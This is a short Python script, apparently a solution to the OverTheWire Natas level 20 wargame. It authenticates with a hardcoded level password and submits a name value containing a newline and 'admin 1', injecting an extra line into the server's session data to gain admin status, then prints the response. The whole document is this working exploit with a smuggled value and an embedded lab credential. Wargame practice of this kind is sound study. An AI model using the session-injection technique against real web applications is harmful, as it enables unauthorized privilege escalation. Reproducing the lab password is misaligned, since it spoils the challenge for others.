import requests, re
u='natas20'
p='eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
l=f'http://{u}.natas.labs.overthewire.org/?debug=true'
sess=requests.Session()
sess.get(l,auth=(u, p))
sess.post(l,auth=(u, p),data={'name':'mikey2520\nadmin 1'})
print(sess.get(l,auth=(u, p)).text)
